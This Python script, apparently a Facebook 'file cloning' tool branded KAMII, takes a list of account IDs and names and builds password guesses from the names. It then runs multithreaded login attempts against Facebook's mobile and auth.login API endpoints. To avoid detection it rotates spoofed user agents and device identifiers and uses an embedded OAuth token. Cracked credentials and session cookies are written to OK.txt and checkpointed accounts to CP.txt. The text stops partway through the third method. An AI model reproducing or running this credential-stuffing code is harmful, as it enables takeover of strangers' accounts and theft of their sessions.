import os
import requests
import random
import sys
import re
import time
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import uuid
import json

pcp = []
loop = 0
oks = []
cps = []
id = []
ugen = ['Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_8 like Mac OS X) AppleWebKit/69_6_8 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/9_6_8;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_3 like Mac OS X) AppleWebKit/69_7_3 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/9_7_3;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 1_1_3 like Mac OS X) AppleWebKit/61_1_3 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/1_1_3;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_5 like Mac OS X) AppleWebKit/610_4_5 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/10_4_5;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_8 like Mac OS X) AppleWebKit/610_9_8 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/10_9_8;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 1_3_7 like Mac OS X) AppleWebKit/61_3_7 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/1_3_7;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_4 like Mac OS X) AppleWebKit/68_7_4 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/8_7_4;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_1 like Mac OS X) AppleWebKit/67_8_1 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/7_8_1;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 4_3_2 like Mac OS X) AppleWebKit/64_3_2 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/4_3_2;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_9 like Mac OS X) AppleWebKit/611_1_9 (KHTML, like Gecko) Mobile/11A501 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/403402.1.0.24.84;FBBV/421409694;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iOS;FBSV/11_1_9;FBSS/3;FBCR/;FBID/phone;FBLC/en-US;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 754 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/91.0 Mobile/78N419 Safari/605.1.15',
'Mozilla/5.0 (Android 10; Mobile; V7520; rv:91.0) Gecko/91.0 Firefox/91.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13126) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4720.165 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; V7520 Build/OMAF.984610.075)',
'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-A479K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4656.107 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 7 12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/172.0.4084.146 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-Y862B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4363.44 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 1342 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/28.0 Mobile/66S431 Safari/605.1.15',
'Mozilla/5.0 (Android 10; Mobile; Infinix 9569; rv:28.0) Gecko/28.0 Firefox/28.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 1394) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.5122.50 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; Infinix 9569 Build/QC89.941441.022.D2)',
'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-W293A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4664.89 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 14 15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4338.147 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-D325R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4206.127 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 703 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/64.0 Mobile/65P722 Safari/605.1.15', 
'Mozilla/5.0 (Android 4; Mobile; Redmi 2199; rv:64.0) Gecko/64.0 Firefox/64.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 1340) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4559.100 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 4; Redmi 2199 Build/LFJFLC)',
'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-J504X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4796.70 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 10 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/193.0.4485.100 Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-Q854Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4685.49 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 614 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.0 Mobile/72Z880 Safari/605.1.15',
'Mozilla/5.0 (Android 10; Mobile; SM-6770; rv:40.0) Gecko/40.0 Firefox/40.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10102) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4313.222 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; SM-6770 Build/OR18.456928.021)',
'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-D334B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4229.69 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 11 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4794.149 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-R436C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4417.149 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 915 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/47.0 Mobile/44X710 Safari/605.1.15',
'Mozilla/5.0 (Android 6; Mobile; Infinix 2470; rv:47.0) Gecko/47.0 Firefox/47.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13155) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4494.78 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 6; Infinix 2470 Build/OM6E.195606.054.D3)',
'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-G433M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4511.76 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 12 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.4701.106 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-E927X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4790.42 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 692 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/50.0 Mobile/46J484 Safari/605.1.15',
'Mozilla/5.0 (Android 13; Mobile; Infinix 7818; rv:50.0) Gecko/50.0 Firefox/50.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 12111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4185.218 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 13; Infinix 7818 Build/TU6N.984746.005.D5)',
'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-M501R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4505.139 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 15 9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/175.0.4507.133 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-E526N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4250.88 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 1642 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/24.0 Mobile/22O781 Safari/605.1.15',
'Mozilla/5.0 (Android 10; Mobile; RMX8358; rv:24.0) Gecko/24.0 Firefox/24.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 1082) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4580.120 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; RMX8358 Build/SICM.341622.020.B2)',
'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-A555A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4531.58 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 11 10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.4880.129 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-W928Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4576.107 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 1250 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/51.0 Mobile/20X113 Safari/605.1.15',
'Mozilla/5.0 (Android 5; Mobile; GT-2259; rv:51.0) Gecko/51.0 Firefox/51.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13154) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4519.217 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 5; GT-2259 Build/MSQ5JD)',
'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-L82Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4214.64 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 11 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.4172.117 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-A529E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4678.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 753 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/35.0 Mobile/86X608 Safari/605.1.15',
'Mozilla/5.0 (Android 8; Mobile; RMX9660; rv:35.0) Gecko/35.0 Firefox/35.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 1264) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5117.223 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 8; RMX9660 Build/PLZD.161410.032.C1)',
'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-L540S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4853.133 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 14 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.4830.130 Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-Q466R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4858.100 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 970 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/37.0 Mobile/55M329 Safari/605.1.15',
'Mozilla/5.0 (Android 6; Mobile; NOKIA X9862; rv:37.0) Gecko/37.0 Firefox/37.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 1392) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4844.189 Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 6; NOKIA X9862 Build/TCHR.621973.090)',
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-G526W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4437.92 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS 14 15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/195.0.4611.99 Safari/537.36',
'Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',
'Mozilla/5.0 (iPad; CPU OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]',
'Mozilla/5.0 (iPad; CPU OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad5,3;FBMD/iPad;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]',
'Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]',
'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/76.0.0.31.70;FBBV/32346928;FBRV/0;FBDV/iPad3,1;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]',
'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/Viettel;FBID/tablet;FBLC/en_US;FBOP/5]',
'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-I600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4896.116 Mobile Safari/537.36',]

os.system('clear')
logo=("""                   

\x1b[1;92m   db   dD  .d8b.  .88b  d88. d888888b d888888b 
\x1b[1;97m   88 ,8P' d8' `8b 88'YbdP`88   `88'     `88'   
\x1b[1;93m   88,8P   88ooo88 88  88  88    88       88    
\x1b[1;96m   88`8b   88~~~88 88  88  88    88       88    
\x1b[1;94m   88 `88. 88   88 88  88  88   .88.     .88.   
\x1b[1;92m   YP   YD YP   YP YP  YP  YP Y888888P Y888888P 
                      
\033[1;37m-------------------------------------------------
\033[37mOwner   :             Kamran Haider
\033[37mFacebook:             Kamran Haider
\033[37mVesion  :             0.1
\033[1;37m-------------------------------------------------""")

def clear():
        os.system('clear')
        print(logo)
def linex():
        print('\033[1;32m----------------------------------------------')

def menu():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File Cloning')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python KAMII.py')
        except:
                pass




def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KAMII] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        dc=dict(session.cookies)
                        coki=";".join([k+"="+v for k,v in dc.items()])
                        if "c_user" in session.cookies.get_dict():
                                print('\r\r\033[1;32m [OK] %s | %s'%(ids,pas))
                                open('/sdcard/OK.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in session.cookies.get_dict():
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                ffb(ids,names,passlist)
        loop+=1


gtt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
                try:
                        global oks,loop
                        sys.stdout.write('\r\r\033[1;37m [KAMII] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ua_string = random.choice(ugen)
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 438142079694454|7Cfc0a7caa49b192f64f6f5a6d9643bb28',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                                        print('\r\r\033[1;32m [OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        api(ids,names,passlist)
                except Exception as e:
                        api(ids,names,passlist)

def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [KAMII] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ua_string = random.choice(ugen)
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
